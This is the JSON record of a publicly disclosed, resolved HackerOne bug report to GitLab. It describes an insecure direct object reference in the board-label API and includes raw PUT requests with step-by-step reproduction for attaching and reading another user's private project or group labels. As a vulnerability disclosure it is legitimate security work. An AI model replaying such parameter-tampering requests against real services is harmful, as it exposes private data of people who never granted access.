{
  "id": 439729,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80Mzk3Mjk=",
  "url": "https://hackerone.com/reports/439729",
  "title": "Add and Access to Labels of any Private Projects/Groups of Gitlab(IDOR)",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2018-11-13T03:44:45.389Z",
  "submitted_at": "2018-11-13T03:44:45.389Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "indoappsec",
    "url": "/indoappsec",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-09-19T19:25:06.817Z",
  "bug_reporter_agreed_on_going_public_at": "2019-09-19T19:25:06.689Z",
  "team_member_agreed_on_going_public_at": "2019-09-19T19:03:10.579Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary & Description :\nIf you have a private project or private group then no non member should be able to access any information.But Adding Labels in your Private boards API request is vulnerable to IDOR attack which is leading to add private group/project labels and access it. \n\n##Vulnerable Request for Project :\n```\nPUT /[username]/[project_name]/boards/[board_id].json HTTP/1.1\nHost: gitlab.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:63.0) Gecko/20100101 Firefox/63.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json;charset=utf-8\nContent-Length: 178\nConnection: close\nCookie: [Cookies]\n\n{\"board\":{\"id\":857058,\"name\":\"Development\",\"labels\":[{\"id\":,\"title\":\"\",\"color\":\"#428BCA\"}],\"milestone_id\":null,\"assignee\":{},\"weight\":null,\"label_ids\":[[Label_ID]]}}\n\n```\n\nVulnerable parameter : label_ids : Label_ID\n\n##Vulnerable Request for Group :\n```\nPUT /groups/vijaykumar007Publicgroup/-/boards/848604.json HTTP/1.1\nHost: gitlab.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:63.0) Gecko/20100101 Firefox/63.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json;charset=utf-8\nContent-Length: 186\nConnection: close\nCookie: [Cookies]\n\n{\"board\":{\"id\":848604,\"name\":\"Developmenthacked\",\"labels\":[{\"id\":,\"title\":\"\",\"color\":\"#F0AD4E\"}],\"milestone_id\":null,\"assignee\":{},\"weight\":null,\"label_ids\":[label_ID]}}\n```\nVulnerable labelID : label_ids\n\n\n## Steps To Reproduce:\nTake 2 different accounts to reproduce this issue.Also I am taking Project for reproduction. \n1.Login from Victim account and create a project.\n2.Make the project private, don't add any member and try to remove all the public permission so it doesn't mixup any permissions.\n3.Create a new label.(Victim_label,ID:12345)\n4.Now login from Attacker account and try to access the victim project. \n5.You will notice that you are not able to victim project.\n6.Now create a new project and go to labels.\n7.Create a new label and go to boards.\n8.Edit the Board and you will see label section.\n9.Add label into the board and intercept the save request. \n10.The request would look something like above mentioned request. \n11.Change the labelID parameter to victim_label_ID in parameter \"label_ids\" and send the request. \n12.You will notice that the private label will be added into the board and you will be able to access it.\nSame you can apply on Private groups too.\n\n\n## Supporting Material/References:\n\n  * List any additional material (e.g. screenshots, logs, etc.)\n\n## Impact\n\nAdd and Access to Labels of any Private Projects/Groups of Gitlab(IDOR)",
  "weakness": {
    "id": 55,
    "name": "Insecure Direct Object Reference (IDOR)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 24,
  "voters": [
    "ali",
    "dhakal_ananda",
    "raslanco",
    "tulswani",
    "term1nal",
    "frichetten",
    "pahadi",
    "rashedul_css",
    "cryptographer",
    "0xm1racle",
    "and 14 more..."
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
